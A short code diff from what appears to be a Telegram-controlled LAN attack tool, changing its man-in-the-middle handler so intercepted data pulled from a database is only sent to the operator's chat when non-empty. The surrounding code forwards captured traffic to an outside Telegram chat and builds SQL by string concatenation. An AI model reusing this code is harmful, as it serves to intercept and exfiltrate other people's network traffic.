@@ -212,7 +212,8 @@ def mitmHandler(target, ID, bot):
                         textline += item[3] + "\n\n"
                     DBcursor.execute("DELETE FROM lanGhost_mitm WHERE id=" + str(item[0]))
                     DBconn.commit()
-                bot.send_message(chat_id=admin_chatid, text=textline)
+                if not textline == "📱 MITM - " + target[0] + "\n\n":
+                    bot.send_message(chat_id=admin_chatid, text=textline)
                 DBconn.close()
                 time.sleep(1)
             except:
